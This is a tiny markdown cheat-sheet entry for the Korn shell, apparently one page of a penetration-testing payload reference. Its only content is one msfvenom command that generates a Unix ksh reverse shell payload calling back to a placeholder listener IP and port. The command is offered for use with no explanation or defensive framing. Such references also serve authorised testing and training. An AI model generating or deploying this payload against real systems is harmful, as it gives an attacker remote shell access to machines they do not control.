# Ksh

## 01 - Generate Payloads

### 1.1 - Reverse Shells

```
$ msfvenom -p cmd/unix/reverse_ksh lhost=<IP> lport=<PORT>
```